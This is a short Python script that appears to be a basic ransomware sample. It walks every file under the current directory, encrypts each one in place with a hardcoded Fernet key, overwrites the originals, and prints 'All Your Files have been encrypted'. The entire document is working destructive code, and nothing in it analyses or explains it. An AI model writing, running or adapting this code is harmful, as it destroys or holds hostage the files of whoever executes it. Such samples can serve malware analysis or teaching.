import os
from cryptography.fernet import Fernet

files = []


def files_in_directory(path):
    try:
        with os.scandir(path) as entries:
            for entry in entries:
                if entry.is_file():
                    files.append(entry)
                elif entry.is_dir():
                    files_in_directory(entry.path)
    except PermissionError:
        pass
files_in_directory(os.getcwd())

for file in files:
    if os.path.basename(file) == "ver1.py" or os.path.basename(file) == "dec.py":
        files.remove(file)
key = bytes(b'YfgbWeczb-N478XYS4F9NSZ4XXQCUz0s2PbH-gx_5ss=')

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_enc = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_enc)



print("All Your Files have been encrypted")

